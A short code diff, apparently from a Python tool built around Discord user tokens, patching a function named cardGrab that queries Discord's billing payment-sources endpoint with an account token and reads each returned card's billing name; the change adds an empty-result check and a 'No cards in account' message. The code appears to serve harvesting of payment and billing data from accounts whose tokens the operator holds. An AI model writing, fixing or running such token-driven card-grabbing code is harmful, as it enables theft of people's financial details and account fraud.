@@ -1346,8 +1346,8 @@ def cardGrab(cc_digits):
                 "https://discordapp.com/api/v6/users/@me/billing/payment-sources",
                 headers={"Authorization": token},
             )
-            if req.status_code in statuses:
-                grabreq = req.json()
+            grabreq = req.json()
+            if req.status_code in statuses and grabreq != []:
                 for grab in grabreq:
                     grab1 = grab["billing_address"]
                     name = grab1["name"]
@@ -1397,6 +1397,7 @@ def cardGrab(cc_digits):
                 errorLog.write(
                     f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [{sessionName}] [Status_code: {req.status_code}] [Message: {req.json()}\n"
                 )
+                print("No cards in account =(")
         elif select == "2":
             print(menu)
             select = str(input("\nSelect: "))
